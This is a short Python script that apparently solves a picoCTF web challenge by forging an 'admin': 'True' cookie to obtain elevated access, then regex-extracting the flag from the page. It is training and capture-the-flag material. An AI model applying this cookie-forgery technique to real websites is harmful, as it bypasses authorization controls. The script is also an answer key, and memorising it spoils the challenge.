#!/usr/bin/env python3

import requests
import re
web = "https://jupiter.challenges.picoctf.org/problem/13594/flag"

username = ''
password = ''

cookie = {'username' : username, 'password' : password, 'admin' : 'True'}

resp = requests.get(web, cookies=cookie).text
resp2 = re.findall("<code>(.*)</code></p>", resp)
flag = "".join(resp2)
print("Your Flag is " + flag)
